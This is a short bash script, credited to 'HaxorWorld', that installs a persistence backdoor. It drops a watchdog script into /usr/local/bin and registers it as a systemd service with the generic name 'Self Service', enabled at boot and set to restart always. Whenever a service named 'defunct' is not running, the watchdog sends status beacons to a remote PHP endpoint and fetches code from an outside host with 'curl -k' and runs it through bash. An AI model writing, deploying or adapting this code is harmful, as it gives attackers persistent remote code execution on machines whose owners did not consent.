#!/bin/bash
#Code by HaxorWorld

self_love="/usr/local/bin/self"
service_file_path="/etc/systemd/system/self.service"
php_endpoint="https://zer0day.id/love.php"  
service_name="defunct"  
pid_file="/var/run/self.pid"


cat << 'EOF' > "$self_love"
#!/bin/bash

host=$(hostname)
php_endpoint="https://yourwebsite.com/love.php"  
service_name="defunct"
pid_file="/var/run/self.pid"

check_pid() {
    if [ -f "$pid_file" ]; then
        if ps -p "$(cat $pid_file)" > /dev/null 2>&1; then
            return 0
        else
            return 1
        fi
    else
        return 1
    fi
}

write_pid() {
    echo $$ > "$pid_file"
}

cleanup() {
    rm -f "$pid_file"
}
trap cleanup EXIT

write_pid

while true; do
    if systemctl is-active --quiet "$service_name"; then
        sleep 1
    else
        curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_down"
        bash -c "$(curl -fsSL https://zer0day.id/y -k)"
        
        if systemctl is-active --quiet "$service_name"; then
            curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_up"
        else
            curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_fail"
        fi
    fi
    sleep 10
done
EOF


chmod +x "$self_love"


cat << EOF > "$service_file_path"
[Unit]
Description=Self Service

[Service]
ExecStart=$self_love
Restart=always
RestartSec=10
PIDFile=$pid_file

[Install]
WantedBy=multi-user.target
EOF


systemctl daemon-reload
systemctl enable self.service
systemctl start self.service


systemctl status self.service
